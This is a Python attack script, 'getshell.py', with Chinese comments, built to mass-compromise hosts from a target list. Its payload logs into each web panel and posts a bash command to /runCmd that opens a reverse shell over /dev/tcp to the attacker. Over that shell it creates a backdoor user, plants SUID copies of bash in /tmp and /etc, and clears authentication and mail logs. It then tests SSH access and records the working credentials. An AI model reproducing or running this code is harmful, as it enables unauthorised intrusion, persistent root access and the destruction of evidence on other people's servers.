import socket
import getopt
import sys
import threading
import subprocess
import random

import requests
import urllib3
import time
import paramiko
urllib3.disable_warnings()

# define some global variables
target  = "0.0.0.0"
IP = ""
port    = ""
command = False
input_file = ''
output_file = ''
'''add your diy name and pass'''
user = 'xxxxxx'
pas = 'xxxxxxx'

def usage():
    print("\n\nWelcome opang nc listen to get shell tools!")
    p = r'''
                                           
    ____  ____ _____  ____ _________  _____
   / __ \/ __ `/ __ \/ __ `/ ___/ _ \/ ___/
  / /_/ / /_/ / / / / /_/ (__  )  __/ /__  
 / .___/\__,_/_/ /_/\__, /____/\___/\___/  
/_/                /____/                  

    '''
    h = r'''
    
           _ __         _ __                 
    ____  (_) /______  (_) /__________  _____
   / __ \/ / //_/ __ \/ / //_/ ___/ _ \/ ___/
  / /_/ / / ,< / /_/ / / ,< (__  )  __/ /__  
 / .___/_/_/|_/ .___/_/_/|_/____/\___/\___/  
/_/          /_/                             

    '''
    print(random.choice([p, h]))
    print("\nUsage: python getshell.py -t target_host -p port")
    print("-I --IP              - the host IP to listen rebound shell")
    print("-p --port            - the target port")
    print("-c --command         - initialize a command shell")
    print("-i --input           - input file path")
    print("-o --output          - output file path")
    print("\n")
    print("Examples:")
    print("python getshell.py -c -I 192.168.0.1 -p 5555 -i fofa_url.txt -o shell.txt\n")
    sys.exit(0)

def getCookie(url,name, passwd):
    Hostreferer = {
        #'Host':'***',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36'
    }
    #urllib或requests在打开https站点是会验证证书。 简单的处理办法是在get方法中加入verify参数，并设为False
    # html = requests.get(url, headers=Hostreferer,verify=False)
    html = requests.post(url+'/auth', headers=Hostreferer, verify=False, data={'username': name, "password": passwd}, timeout=2)
    #获取cookie:DZSW_WSYYT_SESSIONID
    if html.status_code == 200:
        for cookie in html.cookies:
            return cookie.name+'='+cookie.value

def ncwebshell(url, name, passwd):
    Hostreferer = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
        "Cookie": getCookie(url, name, passwd),
        "Origin": url,
        "Referer": url+"/run",
    }
    response = requests.post(url+'/runCmd', headers=Hostreferer, verify=False, data={'cmd': "bash jd.sh;bash -c 'exec bash -i &>/dev/tcp/{IP}/{port} <&1';now&delay=500".format(IP=IP, port=port)})

    return response.status_code

def run_command(command):
        # trim the newline
        command = command.rstrip()
        # run the command and get the output back
        try:
                output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
        except:
                output = "Failed to execute command.\r\n"
        # send the output back to the client
        return output

def print_command(conn):
    while True:
        try:
            callback = conn.recv(1024)
            if len(callable) != 0:
                STDOUT.write(callback)
                stdout.flush()
            else:
                raise socket.error
        except:
            # print("Connect wrong")
            pass


def client_handler(conn):
    if command:
        conn.send(bytes("userdel {}\n\n".format(user), encoding='utf-8'))
        conn.send(bytes("useradd -M -p `openssl passwd -1 -salt 'KakDox89' {}` {}\n\n".format(pas, user), encoding='utf-8'))
        conn.send(bytes('cp /bin/bash /tmp/shell && chmod u+s /tmp/shell\n\n', encoding='utf-8'))
        conn.send(bytes('cp /bin/bash /etc/shell && chmod u+s /etc/shell\n\n', encoding='utf-8'))
        conn.send(bytes('echo > /var/log/btmp; echo > /var/log/wtmp; echo > /var/log/secure; cat /dev/null > /var/spool/mail/root\n\n', encoding='utf-8'))
        conn.send(bytes('exit\n\n', encoding='utf-8'))
        print("get shell")

def test_ssh(host, username, passwd):
    # 建立一个sshclient对象
    ssh = paramiko.SSHClient()
    # 允许将信任的主机自动加入到host_allow 列表，此方法必须放在connect方法的前面
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # 调用connect方法连接服务器
    try:
        ssh.connect(hostname=host, port=22, username=username, password=passwd)
        # 执行命令
        stdin, stdout, stderr = ssh.exec_command('whoami')
        stdin2, stdout2, stderr2 = ssh.exec_command('find /etc -name shell')
        # 结果放到stdout中，如果有错误将放到stderr中
        one = stdout.read().decode().strip()
        two = stdout2.read().decode().strip()
        ssh.close()
        return [True, one, two]
    except:
        ssh.close()
        return [False, None, None]

def send_loop(server):
    conn, address = server.accept()
    print("start attack!")
    client_handler(conn)
    # conn_thread = threading.Thread(target=client_handler, args=(conn,))

def loop():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(1)
    print("Listening...")
    # get one info 
    iterm = LoadIter(input_file)
    for ip,rport,username,password in iterm:
        print('========================')
        outputfile = open(output_file, "a")
        # start listen thread and then to getshell
        result_thread = threading.Thread(target=send_loop, args=(server,))
        result_thread.start()
        # send request payload pacage
        su = 0
        # while True:
        try:
            su = ncwebshell('http://{ip}:{port}'.format(ip=ip,port=rport),username, password)
            if su == 200:
                print('{} {}'.format(su, ip))
        except:
            print("su error!")
                # break
        
        # if conn_thread.join():
        if su == 200:
            if test_ssh(ip, user, pas)[0] == True:
                outputfile.write("{}\t\t用户：{}\t密码：{}\tSUID提权 /etc/shell /tmp/shell\n".format(ip, user, pas))
                print("{}\t用户：{}\t密码：{}\tSUID提权 /etc/shell /tmp/shell".format(ip, user, pas))
            else:
                print("ssh sign in false!")
        outputfile.close()
        print('========================')
    print("Done")
    
    exit(0)
            
class LoadIter(): # 使用迭代器读取url
    def __init__(self, path):
        self.path = path
 
    def __iter__(self):
        for line in open(self.path):
            yield line.split()

def main():
    global IP
    global port
    global command
    global input_file
    global output_file
    if not len(sys.argv[1:]):
        usage()
    # get the command option
    try:
        opts, args = getopt.getopt(sys.argv[1:], "I:p:ci:o:", ["IP", "port", "command", "input", "output"])
    except getopt.GetoptError as err:
        print(err)
    for o,a in opts:
        if o in ("-I", "--IP"):
            IP = a
        elif o in ("-p", "--port"):
            port = int(a)
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-i", "--input"):
            input_file = a
        elif o in ("-o", "--output"):
            output_file = a
        else:
            usage()
            assert False, "Unknow Option"
            
    # going to listen and just get a command shell return
    if command and port > 0:
        loop()
    

if __name__=="__main__":
    main()